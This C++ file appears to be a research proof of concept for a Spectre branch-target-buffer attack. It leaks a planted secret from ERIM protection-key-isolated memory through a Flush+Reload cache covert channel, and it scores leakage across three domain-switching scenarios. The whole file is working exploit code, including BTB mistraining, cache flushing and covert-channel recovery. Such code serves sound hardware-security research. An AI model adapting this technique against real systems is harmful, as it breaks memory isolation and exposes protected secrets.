#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sched.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdarg.h>

#include <iostream>
extern "C" {
//#include <erim.h>
#include "spex.h"
#include "libcache/cacheutils.h"
}

#define SECRET2 'S'

#define SECRET "SSSSSSSSSSSSSSS"
#define DATA   "XXXXXXXXXXXXXXX"

char* public_data;
char* private_data;

#ifndef SCENARIO
  #define SCENARIO 1
#endif

// Base class
class Animal {
protected:
  const char* GetDataPtr(bool read_from_private_data){
    return public_data + (
      private_data - public_data) * static_cast<int>(read_from_private_data);
  }
public:
  virtual char move(size_t index, bool read_from_private_data) = 0;
};

// Bird contains the secret
class Bird : public Animal {
private:
  char secret;
public:
  Bird() {
    secret = SECRET2;
  }
  char move(size_t index, bool /* ---- */) {
     // nop
     return '#';
  }
};

// Class that contains the function to leak data
class Fish : public Animal {
private:
  char data;
public:
  Fish() {
    data = 'F';
  }

  __attribute__((aligned(4096))) char move(size_t index, bool read_from_private_data) {
     return GetDataPtr(read_from_private_data)[index];
  }

  __attribute__((aligned(4096)))  __attribute__((used)) void offset_further_code(){}


};

// Function so that we always call animal->move from the same virtual address
// required for indexing always the same BTB entry
void move_animal(Animal* animal, size_t index, bool read_from_private_data) {
  // Disclosure Gadget (access)
  char c = animal->move(index, read_from_private_data);
  
  if (read_from_private_data){
    // Switch for attack transmit to untrusted
    #if SCENARIO == 2
      Switch_U
    #endif 
  }

  // transimission
  cache_encode(c);
}


char * create_secret() {
  // init isolation and sh mem
  if(erim_init(4096, ERIM_FLAG_ISOLATE_TRUSTED)) {
    exit(EXIT_FAILURE);
  }

  // scanmem for wrpkru
  if(erim_memScan(NULL, NULL, ERIM_UNTRUSTED_PKRU)) {
    exit(EXIT_FAILURE);
  }

  // allocate secret
  char* data = (char*)erim_malloc(sizeof(char) * 128);

  if(data == NULL) {
    printf("allocation of secret failed\n");
    exit(EXIT_FAILURE);
  }
  
  memcpy(data, SECRET, sizeof(SECRET));
  data[sizeof(SECRET)] = '0';
  Switch_U

  return data;
}

char * create_public() {
  char* data = (char*)malloc(sizeof(DATA)+1);

  if(data == NULL) {
    printf("allocation of public failed\n");
    exit(EXIT_FAILURE);
  }

  memcpy(data, DATA, sizeof(DATA));
  // ensure data terminates
  data[sizeof(DATA)] = 0;

  return data;
}


int main(int argc, char **argv) {
  #if EXEC_PREV == 1
    // Resolve the address of the (page-aligned) Fish::move implementation (GCC extension)
    Fish probe;
    #pragma GCC diagnostic push
    #pragma GCC diagnostic ignored "-Wpmf-conversions"
    uint8_t* rawPtr = (uint8_t*)(void*)(probe.*(&Fish::move));
    #pragma GCC diagnostic pop
    setupTAndU(0,0, rawPtr, rawPtr);
  #endif

  // Detect cache threshold
  if(!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  //printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
  pagesize = sysconf(_SC_PAGESIZE);
  char* _mem = (char*)malloc(pagesize*300);
  mem = (char*)(((size_t)_mem & ~(pagesize-1)) + pagesize*2);

  private_data = create_secret();
  public_data = create_public();
  erim_switch_to_untrusted;
  Fish* fish = new Fish();
  Bird* bird = new Bird(); // contains secret
  char* ptr = (char*)((((size_t)move_animal)) & ~(pagesize-1));
  mprotect(ptr, pagesize * 2, PROT_READ | PROT_WRITE | PROT_EXEC);
  memset(mem, 0, pagesize * 290);
  maccess((void*)move_animal);
  ptr[0] = ptr[0];

  int i = 0;  
  int c = 0;
  int score = 0;


  #define MAXITER 50000
  #if SCENARIO == 1
    Switch_U
  #endif

  while(1 && c != MAXITER) {
    c++;
    nospec();

    // mistrain with valid index
    // Switch for training to untrusted (1: always untrusted, 2: last transmit was untrusted)
    #if SCENARIO == 3
      Switch_U
    #endif
    
    // Mistrain the BTB for Fish
    for(int j = 0; j < 1024; j++) {
      move_animal(fish, i, false);
    }
    // Flush our shared memory
    flush_shared_memory();
    mfence();

    // Increase misspeculation chance
    flush(bird);
    mfence();

    #if SCENARIO == 2 || SCENARIO == 3
      Switch_T
    #endif

    nospec();
    // Leak bird secret
    move_animal(bird, i, true);
    
    // Recover data from the covert channel
    for(int i = 1; i < 256; i++) {
      int mix_i = ((i * 167) + 13) & 255; // prefetcher
      if(flush_reload(mem + mix_i * pagesize)) {
        if((mix_i >= 'A' && mix_i <= 'Z') && mix_i != 'X') {
          if (mix_i == 'S'){
            score++;
          }
        }
        fflush(stdout);
        sched_yield();
      }
    }
    i = (i + 1) % sizeof(SECRET);
  }

  Switch_T
  printf("%d, %d, %d", SCENARIO, c, score);
  if (score > 0){
    printf(" <--\n");
  }else{
    printf("\n");
  }
  fflush(stdout);
  return EXIT_SUCCESS;
}
